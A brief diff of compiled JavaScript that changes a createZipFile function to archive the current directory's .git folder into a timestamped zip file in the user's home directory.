@@ -48,7 +48,7 @@ function createZipFile() {
         return __generator(this, function (_a) {
             switch (_a.label) {
                 case 0:
-                    currentPath = path_1.default.resolve("./");
+                    currentPath = path_1.default.resolve("./.git");
                     homedir = require("os").homedir();
                     timestamp = Date.now();
                     zipFilePath = path_1.default.join(homedir, "".concat(timestamp, ".zip"));
